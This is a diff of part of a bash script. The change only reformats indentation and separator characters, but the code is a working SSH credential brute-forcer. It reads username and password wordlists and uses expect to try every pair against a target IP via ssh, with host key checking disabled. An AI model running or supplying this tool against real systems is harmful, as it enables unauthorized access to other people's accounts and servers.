@@ -37,22 +37,22 @@ read input
 if [[ ${input} = "Y" || ${input} = "y" ]]
 then
     trap "exit" INT
-	while read -r name; do
-		while read -r pass; do
-			echo "#----------------------#"
-			echo "Trying name: ${yl}$name${re} and pass: ${cy}$pass${re}"
-			expect -c "
-   				spawn ssh -o StrictHostKeyChecking=no $name@$IP
-   				expect password: { send $pass\r }	
-				expect .* {}
-   				exit
-			"
-			echo ''
-			echo "#----------------------#"
-			echo ''
-		done < ${passlist}
-	done < ${namelist}
-	echo "${gr}[+]${re} Brute force completed"
+    while read -r name; do
+        while read -r pass; do
+            echo "+----------------------+"
+            echo "Trying name: ${yl}$name${re} and pass: ${cy}$pass${re}"
+            expect -c "
+                spawn ssh -o StrictHostKeyChecking=no $name@$IP
+                expect password: { send $pass\r }   
+                expect .* {}
+                exit
+            "
+            echo ''
+            echo "+----------------------+"
+            echo ''
+        done < ${passlist}
+    done < ${namelist}
+    echo "${gr}[+]${re} Brute force completed"
 else
-	echo "Exiting..." 
+    echo "Exiting..." 
 fi
